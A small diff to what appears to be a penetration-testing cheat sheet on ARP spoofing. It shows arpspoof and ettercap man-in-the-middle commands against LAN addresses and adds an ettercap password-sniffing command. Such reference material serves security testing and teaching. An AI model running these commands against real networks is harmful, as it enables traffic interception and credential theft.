@@ -32,6 +32,8 @@ arpspoof -t 192.168.1.3 192.168.1.2
 
 ```bash [ettercap]
 ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -i $interface
+
+sudo ettercap -T -P password_sniffer -i $interface # Password sniffing
 ```
 
 ```bash [bettercap]
